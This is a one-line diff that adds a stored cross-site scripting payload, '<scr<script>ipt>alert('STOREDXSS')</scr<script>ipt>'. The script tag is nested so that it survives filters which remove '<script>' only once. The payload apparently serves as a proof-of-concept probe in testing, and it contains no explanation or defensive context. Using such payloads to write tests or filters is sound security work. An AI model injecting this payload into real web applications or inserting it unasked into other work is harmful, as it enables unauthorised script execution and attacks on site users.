@@ -1,0 +1,1 @@
+<scr<script>ipt>alert('STOREDXSS')</scr<script>ipt>
